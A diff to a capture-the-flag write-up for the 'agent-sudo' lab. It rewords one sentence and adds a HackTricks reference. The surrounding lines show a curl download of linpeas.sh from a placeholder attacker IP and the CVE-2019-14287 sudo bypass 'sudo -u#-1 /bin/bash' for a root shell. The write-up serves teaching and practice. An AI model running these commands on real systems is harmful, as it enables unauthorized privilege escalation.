@@ -239,9 +239,11 @@ target:
 james@agent-sudo:~$ curl <ATTACKER-IP>:8009/linpeas.sh -o linpeas.sh
 ```
 
-After running, `sudo` seems exploitable (https://nvd.nist.gov/vuln/detail/CVE-2019-14287).
+After running, `sudo` seems vulnerable (https://nvd.nist.gov/vuln/detail/CVE-2019-14287).
 
 ![linpeas](images/sudo.png)
+
+After some research, [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version) has a solution for us.
 
 ```
 james@agent-sudo:~$ sudo -u#-1 /bin/bash
